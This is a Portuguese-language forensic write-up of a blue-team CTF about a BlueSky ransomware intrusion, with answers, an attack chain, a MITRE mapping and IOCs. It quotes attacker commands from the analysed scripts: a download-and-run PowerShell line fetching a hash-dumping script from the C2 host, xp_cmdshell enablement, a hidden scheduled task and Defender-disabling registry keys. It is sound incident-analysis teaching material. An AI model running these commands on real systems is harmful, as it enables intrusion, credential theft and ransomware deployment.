# 🔵 BlueSky Ransomware — CTF Writeup
### CyberDefenders Blue Team Challenge | Forense de Rede & Análise de Malware

---

| **Analista**          | Mauricio Robert                                                                           |
|-----------------------|-------------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                         |
| **Data do Relatório** | 13/06/2026                                                                                |
| **Data do Incidente** | 23/04/2024                                                                                |
| **Classificação**     | CONFIDENCIAL                                                                              |
| **Ferramentas**       | Wireshark · CyberChef · VirusTotal · Palo Alto Unit 42 · Event Viewer                    |
| **Arquivo**           | `BlueSkyRansomware.pcap`                                                                  |

---

## 🔍 Resumo Executivo

Um ataque em múltiplos estágios foi conduzido a partir do IP malicioso **`87.96.21.81`**, que iniciou com varredura de portas e acesso ao **SQL Server** da vítima com credenciais comprometidas (`sa` / `cyb3rd3f3nd3r$`). Após o acesso inicial, o atacante escalou privilégios **injetando um agente C2 no processo `winlogon.exe`** (SYSTEM) via `xp_cmdshell` e executou uma cadeia de **scripts PowerShell** para desabilitar o Windows Defender, criar persistência, fazer dump de hashes NTLM e propagar-se lateralmente via **SMB Pass-the-Hash**. A etapa final foi a implantação do **BlueSky Ransomware** (`javaw.exe`) — variante moderna da família **Conti**, com algoritmo **ChaCha20** para criptografia — que criptografou os arquivos com a extensão `.bluesky` e deixou a nota **`# DECRYPT FILES BLUESKY #`**.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta              | Finalidade                                                                                |
|-------------------------|-------------------------------------------------------------------------------------------|
| **Wireshark**           | Análise da captura PCAP — tráfego TDS/MSSQL, HTTP e streams TCP                          |
| **CyberChef**           | Decodificação Base64 de scripts PowerShell obfuscados                                     |
| **VirusTotal**          | Identificação de família, hashes, comportamento e TTPs do malware                        |
| **Palo Alto Unit 42**   | Referência técnica sobre a família BlueSky Ransomware e mapeamento MITRE ATT&CK           |
| **Event Viewer**        | Análise de logs do Windows PowerShell e MSSQL para investigação de artefatos              |

---

## 📋 Perguntas e Respostas

### Q1 — Qual é o IP de origem responsável pela varredura de portas?

> **Resposta: `87.96.21.81`**

**Solução:** A análise dos endpoints IPv4 em *Statistics → Endpoints → IPv4* no Wireshark revelou dois IPs comunicando-se com o host alvo. O endereço `87.96.21.81` aparece como a fonte dos primeiros pacotes (1–8), onde consultas DNS para `g.live.com` e respostas ICMP `Destination unreachable (Port unreachable)` indicam **atividade de reconhecimento de portas**. Este IP iniciou toda a cadeia de ataque, atuando como servidor de Comando e Controle (C2).

![IP do Atacante](/Forensic/BlueSkyRansonware/images/Attacker_IP(1).png)

---

### Q2 — Qual é o nome de usuário da conta alvo?

> **Resposta: `sa`**

**Solução:** A análise do tráfego **TDS (Tabular Data Stream)** do protocolo MSSQL no Wireshark, filtrado por `ip.addr == 87.96.21.81 && tds`, revelou no pacote **2641** um `TDS7 login`. A expansão do campo `TDS7 Login Packet` exibe claramente:

```
Username: sa
```

O usuário `sa` (System Administrator) é a conta padrão do SQL Server, exposta em texto claro no protocolo TDS pré-TLS.

![Nome do Alvo](/Forensic/BlueSkyRansonware/images/Username_Login_Attacket(2).png)

---

### Q3 — Qual é a senha descoberta pelo atacante?

> **Resposta: `cyb3rd3f3nd3r$`**

**Solução:** No mesmo pacote TDS7 login (frame 2641), o campo **`Password`** do login packet revela a senha:

```
Password: cyb3rd3f3nd3r$   (tds7login.password, 28 bytes)
Server name: 87.96.21.81
Database name: master
```

A senha confirma o sucesso do ataque de força bruta ou credential stuffing para acesso ao SQL Server alvo.

![Senha Descoberta](/Forensic/BlueSkyRansonware/images/Password_Used_for_Attacking(3).png)

---

### Q4 — Qual configuração foi habilitada para facilitar a movimentação lateral?

> **Resposta: `xp_cmdshell`**

**Solução:** A análise do stream TCP 1161 no Wireshark exibe em ASCII o conteúdo das queries SQL executadas após o login. O stream revela os seguintes comandos de reconfiguração:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

A stored procedure **`xp_cmdshell`** permite executar comandos do sistema operacional diretamente pelo SQL Server, sendo essencial para execução remota de comandos e movimento lateral.

![Conf. Utilizada para Movimentacao Lateral](/Forensic/BlueSkyRansonware/images/Attacker_Change_Settings_for_Lateral_Movements(4).png)

---

### Q5 — Qual processo recebeu a injeção do agente C2 para escalonamento de privilégios?

> **Resposta: `winlogon.exe`**

**Solução:** A análise dos logs do **Event Viewer** (Windows PowerShell, Event ID 400) mostra o evento `Engine state is changed from None to Available`, com o campo:

```
HostApplication: winlogon.exe
Computer:        DESKTOP-7EQvM78
```

O `winlogon.exe` é um processo de sistema que roda com privilégios **SYSTEM**, fornecendo ao atacante escalonamento imediato de privilégios após a injeção do agente C2 via `xp_cmdshell`.

![Processo Injetado para C2](/Forensic/BlueSkyRansonware/images/Process_Injected_C2(5).png)

---

### Q6 — Qual foi a primeira URL do arquivo baixado após o escalonamento de privilégios?

> **Resposta: `http://87.96.21.84/checking.ps1`**

**Solução:** O filtro `http` no Wireshark mostra as primeiras requisições GET realizadas após o escalonamento. O **pacote 4214** registra:

```
GET /checking.ps1 HTTP/1.1
Host: 87.96.21.84
Full request URI: http://87.96.21.84/checking.ps1
```

Este é o primeiro script PowerShell baixado pelo atacante para iniciar a fase de descoberta e evasão de defesas.

![Primeira URL](/Forensic/BlueSkyRansonware/images/First_URL_for_Downloading_Archive(6).png)

---

### Q7 — Qual Group SID o script malicioso verifica?

> **Resposta: `S-1-5-32-544`**

**Solução:** O script `checking.ps1`, analisado no Notepad, contém na primeira linha a verificação de privilégios:

```powershell
$priv = [bool]([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
$osver = ([environment]::OSVersion.Version).Major
```

O SID **`S-1-5-32-544`** corresponde ao grupo built-in **Administrators** do Windows. O script verifica se o usuário pertence a este grupo para determinar qual caminho de execução seguir: `CleanerEtc` (com privilégios administrativos) ou `CleanerNoPriv` (sem privilégios).

![SID](/Forensic/BlueSkyRansonware/images/Verify_SID_Script_ps1(7).png)

---

### Q8 — Quais chaves de registro foram usadas para desabilitar o Windows Defender?

> **Resposta: `DisableAntiSpyware, DisableRoutinelyTakingAction, DisableRealtimeMonitoring, SubmitSamplesConsent, SpynetReporting`**

**Solução:** O script `checking.ps1` contém a função `Disable-WindowsDefender` que opera sobre:

```
HKLM:\SOFTWARE\Microsoft\Windows Defender
```

O array `$defenderRegistryKeys` define as **5 chaves** modificadas para `1`:

| Chave de Registro | Efeito |
|-------------------|--------|
| `DisableAntiSpyware` | Desabilita o módulo anti-spyware |
| `DisableRoutinelyTakingAction` | Desabilita ações automáticas de remediação |
| `DisableRealtimeMonitoring` | Desabilita a proteção em tempo real |
| `SubmitSamplesConsent` | Desabilita o envio de amostras à Microsoft |
| `SpynetReporting` | Desabilita a participação no SpyNet/MAPS |

Adicionalmente, o script adiciona exclusões de path (`C:\ProgramData\Oracle`, `C:\ProgramData\Oracle\Java`, `C:\Windows`) e para o serviço `WinDefend` para sistemas Windows 10.

![Windows Defender](/Forensic/BlueSkyRansonware/images/Disable_Path_Windows_Defender(8).png)

---

### Q9 — Qual foi a URL do segundo arquivo baixado pelo atacante?

> **Resposta: `http://87.96.21.84/del.ps1`**

**Solução:** Continuando a análise do tráfego HTTP no Wireshark, o **pacote 4251** registra a segunda requisição:

```
GET /del.ps1 HTTP/1.1
Host: 87.96.21.84
User-Agent: Mozilla/5.0 (Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4291
Full request URI: http://87.96.21.84/del.ps1
```

O script `del.ps1` é o arquivo responsável pela criação de tarefas agendadas para persistência no sistema.

![Segunda URL](/Forensic/BlueSkyRansonware/images/Second_URL_for_Downloading_Archive(9).png)

---

### Q10 — Qual é o nome completo da tarefa criada para persistência?

> **Resposta: `\Microsoft\Windows\MUI\LPupdate`**

**Solução:** O script `del.ps1`, analisado no Notepad, contém na função `CleanerEtc` o seguinte comando:

```powershell
C:\Windows\System32\schtasks.exe /f /tn "\Microsoft\Windows\MUI\LPupdate" `
  /tr "C:\Windows\System32\cmd.exe /c powershell -ExecutionPolicy Bypass `
  -File C:\ProgramData\del.ps1" /ru SYSTEM /sc HOURLY /mo 4 /create | Out-Null
```

O nome **`\Microsoft\Windows\MUI\LPupdate`** foi escolhido para se camuflar como uma tarefa legítima do Windows relacionada ao **Multilingual User Interface (MUI)**, dificultando a detecção. A tarefa é executada como **SYSTEM** a cada **4 horas**.

![Persistencia](/Forensic/BlueSkyRansonware/images/Task_Created_for_Persistence(10).png)

---

### Q11 — Qual é o MITRE ATT&CK ID da tática principal do segundo arquivo malicioso?

> **Resposta: `TA0005`**

**Solução:** A análise do `javaw.exe` (hash `3e035f2d7d30869ce53171ef5a0f761bfb9c14d94d9fe6da385e20b8d96dc2fb`) no VirusTotal, aba **BEHAVIOR**, revela o mapeamento MITRE ATT&CK. A tática **"Stealth"** está destacada em azul com o identificador **`TA0005`** (Defense Evasion), com 4 técnicas associadas:

```
TA0005 — Defense Evasion (Stealth) — 4 técnicas:
  T1036  Masquerading
  T1497  Virtualization/Sandbox Evasion (4 ocorrências)
  T1564  Hide Artifacts
```

O malware implementa verificações anti-VM via instruções CPUID, mascaramento de processo sobrescrevendo buffers PEB, e evasão de sandbox com funções dedicadas.

![MITRE ATT&CK ID](/Forensic/BlueSkyRansonware/images/MITRE_ATT&CK_TA0005(11).png)

---

### Q12 — Qual script PowerShell foi invocado para fazer dump de credenciais?

> **Resposta: `Invoke-PowerDump.ps1`**

**Solução:** O script `ichigo-lite.ps1`, analisado no Notepad, contém na primeira linha:

```powershell
Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://87.96.21.84/Invoke-PowerDump.ps1')
```

Confirmado via decodificação Base64 no **CyberChef** do comando obfuscado presente no script. O `Invoke-PowerDump.ps1` é baseado no **Posh-SecMod** de darkoperator (GitHub: `darkoperator/Posh-SecMod`) e realiza:

```
SYNOPSIS: Dumps hashes from the local system.
Note: administrative privileges required.
```

O script usa `System.Runtime.InteropServices` para acessar o registro e extrair hashes **NTLM** dos usuários do sistema.

![Script de DUMP](/Forensic/BlueSkyRansonware/images/Script_PowerShell_Used_for_Dump_Credentials(12).png)

---

### Q13 — Qual é o nome do arquivo texto que contém as credenciais exfiltradas?

> **Resposta: `hashes.txt`**

**Solução:** O script `ichigo-lite.ps1` contém a linha de leitura das credenciais coletadas:

```powershell
$hashesContent = Get-Content -Path "C:\ProgramData\hashes.txt" -ErrorAction SilentlyContinue
```

O arquivo **`hashes.txt`**, localizado em `C:\ProgramData\`, armazena os hashes NTLM extraídos pelo `Invoke-PowerDump.ps1`. O script processa o arquivo com um padrão regex para extrair usernames e hashes no formato NTHash, usando-os com **Invoke-SMBExec** para movimentação lateral via **Pass-the-Hash**.

![Credenciais Exfiltradas](/Forensic/BlueSkyRansonware/images/txt_Used_for_Save_Credentials(13).png)

---

### Q14 — Qual é o nome do arquivo texto que contém os hosts descobertos?

> **Resposta: `extracted_hosts.txt`**

**Solução:** O script `ichigo-lite.ps1` contém a requisição web para obter a lista de alvos:

```powershell
$hostsContent = Invoke-WebRequest -Uri "http://87.96.21.84/extracted_hosts.txt" `
  | Select-Object -ExpandProperty Content -ErrorAction Stop
```

O arquivo **`extracted_hosts.txt`** é servido pelo servidor C2 (`87.96.21.84`) e contém a lista de hosts descobertos durante o reconhecimento. O script itera sobre cada host para executar o movimento lateral com **Invoke-SMBExec**, propagando o acesso a outras máquinas da rede.

![.txt dos Hosts](/Forensic/BlueSkyRansonware/images/Name_of_Archive_of_Content_Hosts(14).png)

---

### Q15 — Qual é o nome do arquivo de nota de resgate do ransomware?

> **Resposta: `# DECRYPT FILES BLUESKY #`**

**Solução:** A análise do `javaw.exe` no VirusTotal e a referência ao artigo da **Palo Alto Unit 42** sobre BlueSky Ransomware confirmam o padrão do arquivo de nota de resgate:

```
BlueSky Ransomware renames the encrypted files with the file extension .bluesky
and drops a ransom note file named:
  # DECRYPT FILES BLUESKY #.txt
  # DECRYPT FILES BLUESKY #.html
```

A nota informa a vítima sobre a criptografia e fornece instruções para pagamento do resgate.

![Mensagem](/Forensic/BlueSkyRansonware/images/Mensage_of_Decrypt_BlueSky(15).png)

---

### Q16 — Qual é o nome da família do ransomware?

> **Resposta: `BlueSky`**

**Solução:** A análise do hash `3e035f2d7d30869ce53171ef5a0f761bfb9c14d94d9fe6da385e20b8d96dc2fb` no VirusTotal mostra **64/71 detecções positivas**, com:

```
Popular threat label: ransomware.bluesky/conti
Family labels:        bluesky, conti, encoder
```

Detecções representativas: AhnLab-V3 (`Ransomware/Win.Bluesky.R500579`), CTX (`Exe.ransomware.bluesky`), ClamAV (`Win.Ransomware.Bluesky-9980052-0`). O artigo da **Palo Alto Unit 42** (agosto/2022) confirma que BlueSky é uma família emergente com similaridades de código com **Conti v3**, usando **ChaCha20** para criptografia de arquivos e **Curve25519** para geração de chaves.

![Familia BlueSky](/Forensic/BlueSkyRansonware/images/Bluesky_Family(16).png)

---

## ⛓ Cadeia de Ataque (Kill Chain)

```
[1] RECONHECIMENTO
    Varredura de portas — 87.96.21.81 identifica SQL Server exposto (87.96.21.84:1433)
    DNS queries + ICMP Destination unreachable
    ↓
[2] ACESSO INICIAL
    Login MSSQL: sa / cyb3rd3f3nd3r$ — banco de dados master
    Credencial comprometida via brute force / credential stuffing
    ↓
[3] ESCALONAMENTO DE PRIVILÉGIOS
    EXEC sp_configure 'xp_cmdshell', 1 → execução de comandos OS via SQL
    Injeção de agente C2 no winlogon.exe (SYSTEM)
    ↓
[4] EVASÃO DE DEFESAS
    Download de checking.ps1 → Disable-WindowsDefender
    5 registry keys + exclusões de path + serviço WinDefend desabilitado
    ↓
[5] PERSISTÊNCIA
    Download de del.ps1 → schtasks.exe
    Tarefa: \Microsoft\Windows\MUI\LPupdate — SYSTEM / HOURLY /mo 4
    ↓
[6] DUMP DE CREDENCIAIS
    ichigo-lite.ps1 → Invoke-PowerDump.ps1
    Hashes NTLM → C:\ProgramData\hashes.txt
    ↓
[7] MOVIMENTO LATERAL
    Invoke-SMBExec + extracted_hosts.txt
    Pass-the-Hash para todos os hosts da rede via SMB
    ↓
[8] IMPLANTAÇÃO DO RANSOMWARE
    javaw.exe (BlueSky / Conti) — ChaCha20 + Curve25519
    Extensão .bluesky | Nota: # DECRYPT FILES BLUESKY #.txt / .html
```

---

## 🗺 Mapeamento MITRE ATT&CK

| ID | Técnica | Tática | Artefato |
|----|---------|--------|----------|
| T1046 | Network Service Discovery — varredura de portas | Reconnaissance | IP `87.96.21.81` |
| T1078.002 | Valid Accounts: Domain Accounts — SQL Server `sa` | Initial Access | Credenciais `sa` |
| T1505.001 | SQL Stored Procedures — `xp_cmdshell` habilitado | Persistence / Execution | `xp_cmdshell` |
| T1055 | Process Injection — C2 injetado no `winlogon.exe` | Privilege Escalation | `winlogon.exe` |
| T1059.001 | PowerShell — `checking.ps1`, `del.ps1`, `ichigo-lite.ps1` | Execution | Scripts PS1 |
| T1562.001 | Disable or Modify Tools — Windows Defender registry | Defense Evasion (TA0005) | 5 registry keys |
| T1003.002 | OS Credential Dumping — `Invoke-PowerDump.ps1` | Credential Access | `hashes.txt` |
| T1053.005 | Scheduled Task/Job — `\Microsoft\Windows\MUI\LPupdate` | Persistence | `schtasks.exe` |
| T1021.002 | Remote Services: SMB — `Invoke-SMBExec` Pass-the-Hash | Lateral Movement | `extracted_hosts.txt` |
| T1486 | Data Encrypted for Impact — BlueSky Ransomware | Impact | `javaw.exe` / `.bluesky` |
| T1491 | Defacement — nota de resgate deixada na vítima | Impact | `# DECRYPT FILES BLUESKY #` |

---

## 🚨 Indicadores de Comprometimento (IOCs)

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| IP Atacante/C2 | `87.96.21.81` | Origem do ataque — varredura e agente C2 |
| IP Servidor C2 | `87.96.21.84` | Servidor que serve os scripts PS1 e malware |
| Credencial SQL | `sa / cyb3rd3f3nd3r$` | Credenciais SQL Server comprometidas |
| URL Script 1 | `http://87.96.21.84/checking.ps1` | Script de verificação de privilégios e AV bypass |
| URL Script 2 | `http://87.96.21.84/del.ps1` | Script de persistência via schtasks |
| URL Script 3 | `http://87.96.21.84/ichigo-lite.ps1` | Script de dump e movimento lateral |
| URL Script 4 | `http://87.96.21.84/Invoke-PowerDump.ps1` | Script dump de hashes NTLM |
| URL Script 5 | `http://87.96.21.84/Invoke-SMBExec.ps1` | Script de movimento lateral SMB |
| URL Hosts | `http://87.96.21.84/extracted_hosts.txt` | Lista de hosts alvo para movimento lateral |
| URL Malware | `http://87.96.21.84/javaw.exe` | Payload BlueSky Ransomware |
| SHA-256 | `3e035f2d7d30869ce53171ef5a0f761bfb9c14d94d9fe6da385e20b8d96dc2fb` | Hash do `javaw.exe` (BlueSky) |
| Família | BlueSky / Conti | 64/71 vendors no VirusTotal |
| Extensão | `.bluesky` | Extensão dos arquivos criptografados |
| Nota de Resgate | `# DECRYPT FILES BLUESKY #.txt / .html` | Arquivo de nota de resgate |
| Tarefa Agendada | `\Microsoft\Windows\MUI\LPupdate` | Persistência SYSTEM — executa a cada 4h |
| Arquivo Credenciais | `C:\ProgramData\hashes.txt` | Hashes NTLM coletados |
| Processo Injetado | `winlogon.exe` | Processo com agente C2 (SYSTEM) |
| Registry Path | `HKLM:\SOFTWARE\Microsoft\Windows Defender` | Chaves modificadas para desabilitar AV |
| SID Verificado | `S-1-5-32-544` | Group SID Administrators — verificado pelo script |

---

## ✅ Resumo das Flags

| # | Pergunta | Flag / Resposta |
|---|----------|-----------------|
| Q1 | IP do atacante (varredura de portas) | `87.96.21.81` |
| Q2 | Nome de usuário da conta alvo | `sa` |
| Q3 | Senha usada pelo atacante | `cyb3rd3f3nd3r$` |
| Q4 | Configuração habilitada para movimento lateral | `xp_cmdshell` |
| Q5 | Processo injetado com o agente C2 | `winlogon.exe` |
| Q6 | Primeira URL baixada pós-escalonamento | `http://87.96.21.84/checking.ps1` |
| Q7 | Group SID verificado pelo script | `S-1-5-32-544` |
| Q8 | Chaves de Registro do Windows Defender desabilitadas | `DisableAntiSpyware, DisableRoutinelyTakingAction, DisableRealtimeMonitoring, SubmitSamplesConsent, SpynetReporting` |
| Q9 | Segunda URL baixada | `http://87.96.21.84/del.ps1` |
| Q10 | Nome da tarefa de persistência | `\Microsoft\Windows\MUI\LPupdate` |
| Q11 | MITRE ATT&CK ID da tática principal | `TA0005` |
| Q12 | Script de dump de credenciais | `Invoke-PowerDump.ps1` |
| Q13 | Arquivo com credenciais exfiltradas | `hashes.txt` |
| Q14 | Arquivo com hosts descobertos | `extracted_hosts.txt` |
| Q15 | Nome da nota de resgate | `# DECRYPT FILES BLUESKY #` |
| Q16 | Família do ransomware | `BlueSky` |

---

## 📚 Referências

- [MITRE ATT&CK — T1505.001 SQL Stored Procedures](https://attack.mitre.org/techniques/T1505/001/)
- [MITRE ATT&CK — T1055 Process Injection](https://attack.mitre.org/techniques/T1055/)
- [MITRE ATT&CK — T1003.002 OS Credential Dumping](https://attack.mitre.org/techniques/T1003/002/)
- [MITRE ATT&CK — T1486 Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486/)
- [Palo Alto Unit 42 — BlueSky Ransomware Fast Encryption](https://unit42.paloaltonetworks.com/bluesky-ransomware/)
- [Invoke-PowerDump — Posh-SecMod](https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1)
- [Invoke-SMBExec — Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [VirusTotal](https://www.virustotal.com/)
- [CyberChef](https://gchq.github.io/CyberChef/)
- [CyberDefenders — BlueSky Ransomware CTF](https://cyberdefenders.org/)

---